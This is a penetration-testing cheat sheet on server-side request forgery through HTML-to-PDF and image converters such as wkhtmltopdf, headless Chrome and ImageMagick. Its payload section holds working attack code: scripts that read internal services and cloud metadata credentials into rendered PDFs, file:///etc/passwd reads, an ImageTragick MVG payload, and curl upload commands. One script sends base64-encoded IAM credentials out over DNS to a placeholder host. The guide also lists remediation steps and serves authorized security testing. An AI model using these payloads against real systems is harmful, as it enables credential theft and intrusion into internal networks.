# SSRF via PDF / Image Processing

## Overview
Server-side SSRF can be triggered through document and image processing features when the underlying rendering library (wkhtmltopdf, headless Chrome, PhantomJS, LibreOffice, ImageMagick, Pillow) fetches external resources during rendering. These converters are often configured with full network access and run as privileged users, making them high-value targets. Because the SSRF originates from a document renderer rather than the application's primary HTTP client, it frequently bypasses SSRF filters applied to explicit URL parameters and can execute JavaScript (in HTML-to-PDF scenarios) to perform more complex interactions with internal services.

## How It Works
An attacker submits a crafted HTML document, SVG image, or other file to a conversion endpoint. The renderer, when processing the document, encounters embedded resources — `<img src="...">`, `<link href="...">`, CSS `url()`, SVG `<image>`, or JavaScript `fetch()` calls — and initiates outbound HTTP requests to fetch them. If the renderer is wkhtmltopdf or headless Chrome, it can also execute JavaScript, allowing the attacker to use `XMLHttpRequest` or `fetch()` to read internal HTTP responses and embed them in the rendered output. The resulting PDF or image returned to the attacker may contain the content of internal service responses.

## Impact
- Read files from the server's local filesystem via `file://` URIs
- Access internal HTTP services (cloud metadata, admin panels, internal APIs)
- Execute JavaScript to perform complex requests and exfiltrate responses into the PDF output
- Perform SSRF with full browser capabilities (cookies, redirects, JavaScript execution) when headless Chrome is used
- Enumerate internal network topology
- Bypass SSRF filters applied elsewhere in the application

## Where to Look
- "Export to PDF" or "Print to PDF" features
- HTML-to-PDF converters (invoices, reports, certificates)
- Screenshot / URL-to-image services
- Profile/avatar image resizing (ImageMagick, PIL)
- Document preview generation (LibreOffice conversion)
- SVG upload and rendering
- HTML email template preview features
- Resume / CV upload and parsing features
- Import features that process uploaded files with embedded URLs (Word .docx with OLE objects, etc.)

## Testing Steps
1. Locate any feature that accepts HTML, SVG, or document input and returns a rendered file (PDF, PNG, etc.).
2. Upload or submit a minimal HTML file containing an external resource fetch: `<img src="http://YOUR-OOB-HOST/ssrf-pdf-test">`.
3. Monitor your OOB listener for callbacks. If received, the renderer is making outbound requests.
4. Determine the renderer in use (check response headers, error messages, PDF metadata with `pdfinfo` or `exiftool`).
5. If wkhtmltopdf or headless Chrome: craft JavaScript to `fetch()` internal URLs and embed the response:
   ```html
   <script>
   var x = new XMLHttpRequest();
   x.open('GET','http://127.0.0.1:8080/admin',false);
   x.send();
   document.write(x.responseText);
   </script>
   ```
6. For ImageMagick: use MVG or SVG-based SSRF (ImageTragick).
7. Try `file://` URIs: `<img src="file:///etc/passwd">` or `<iframe src="file:///etc/passwd">`.
8. Download the resulting PDF and check if internal content is visible.

## Payloads / Techniques

```html
<!-- Basic OOB callback in HTML-to-PDF -->
<html>
<body>
<img src="http://YOUR-OOB-HOST/ssrf-via-pdf">
<link rel="stylesheet" href="http://YOUR-OOB-HOST/css-ssrf">
</body>
</html>
```

```html
<!-- Read local file via file:// in wkhtmltopdf -->
<html>
<body>
<iframe src="file:///etc/passwd" width="800" height="600"></iframe>
<img src="file:///etc/hosts">
</body>
</html>
```

```html
<!-- JavaScript-based SSRF in wkhtmltopdf / Headless Chrome -->
<!-- Fetches internal URL and embeds response in the PDF -->
<html>
<body>
<script>
var req = new XMLHttpRequest();
req.open('GET', 'http://127.0.0.1:9200/_cat/indices', false);  // Elasticsearch
req.send(null);
document.write('<pre>' + req.responseText + '</pre>');
</script>
</body>
</html>
```

```html
<!-- Cloud metadata via PDF renderer -->
<html>
<body>
<script>
var req = new XMLHttpRequest();
req.open('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', false);
req.send(null);
document.write('<pre>METADATA: ' + req.responseText + '</pre>');
</script>
</body>
</html>
```

```html
<!-- SVG-based SSRF -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image href="http://YOUR-OOB-HOST/svg-ssrf" height="200" width="200"/>
  <image href="file:///etc/passwd" height="200" width="200"/>
</svg>
```

```
# ImageMagick SSRF via MVG (ImageTragick - CVE-2016-3714)
push graphic-context
viewbox 0 0 640 480
fill 'url(http://YOUR-OOB-HOST/imagetragick)'
pop graphic-context
```

```
# ImageMagick SSRF via SVG with embedded HTTP resource
(same as SVG above — ImageMagick processes SVG files)
```

```bash
# Check PDF metadata to identify the renderer
exiftool output.pdf | grep -i "creator\|producer\|tool"
pdfinfo output.pdf

# Common producers that are exploitable:
# wkhtmltopdf — supports JS, file://, network access
# PhantomJS — supports JS, file://
# Headless Chrome/Chromium — supports JS, limited file://
# LibreOffice — limited network access
# fpdf/TCPDF/mPDF — pure PHP, usually not exploitable via rendered content

# Test with curl (multipart upload)
curl -s "https://target.com/api/convert" \
  -F "file=@/tmp/ssrf_test.html;type=text/html" \
  -o output.pdf

# Check if SSRF worked
pdftotext output.pdf - | grep -i "root:\|AccessKeyId\|token"

# Test ImageMagick convert endpoint
curl -s "https://target.com/api/resize" \
  -F "image=@/tmp/ssrf.svg;type=image/svg+xml" \
  -o result.png
```

```html
<!-- Advanced: Exfiltrate via DNS using fetch + btoa -->
<script>
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(r => r.text())
  .then(d => {
    var encoded = btoa(d).replace(/=/g,'').substring(0,50);
    fetch('http://' + encoded + '.YOUR-OOB-HOST/dns-exfil');
  });
</script>
```

## Burp Suite Tips
- Intercept the document upload/submit request and modify the file content inline using the **Hex editor** or paste a crafted payload.
- Use **Collaborator** to generate an OOB URL to embed in the document — check Collaborator for DNS/HTTP callbacks after the PDF is generated.
- Download the resulting PDF and use Burp's **Decoder** to inspect raw bytes, or open externally with `pdftotext`.
- Use **Repeater** to repeatedly test different payloads (file:// paths, internal IPs) without re-uploading through the browser UI.
- For multipart upload requests, right-click in Repeater and use **Change Body Encoding** if needed.

## Tools
- Burp Suite Pro (Collaborator, Repeater, Intruder)
- interactsh — OOB listener
- exiftool / pdfinfo — identify the PDF renderer
- pdftotext — extract text from resulting PDF
- wkhtmltopdf (local) — reproduce and test locally
- SSRFmap — some SSRF-via-file-upload modules
- ImageMagick (identify/convert) — test locally for ImageTragick

## Remediation
- Disable JavaScript execution in PDF renderers (wkhtmltopdf: `--disable-javascript`; headless Chrome: use `--no-sandbox` alternatives with restricted JS).
- Disable network access in the PDF renderer process: use sandboxing, network namespaces, or `--disable-local-file-access` and firewall rules.
- Sanitize and validate all HTML input before passing to the renderer — use an allowlist of safe HTML tags and attributes; strip `<script>`, `<iframe>`, `<link>`, and event handlers.
- Run the PDF renderer in an isolated container or sandbox with no network access to internal services.
- Disable `file://` protocol access in the renderer.
- For ImageMagick: apply the policy.xml restrictions to disable dangerous coders (MVG, SVG, URL, HTTP, HTTPS).
- Apply egress firewall rules to the renderer's process/container.

## References
https://portswigger.net/research/server-side-pdf-injection
https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-via-pdf-generator
https://imagetragick.com/
https://docs.wkhtmltopdf.org/usage/wkhtmltopdf.txt
https://blog.detectify.com/2019/01/10/ssrf-and-local-file-read-in-product-hunt-embed/
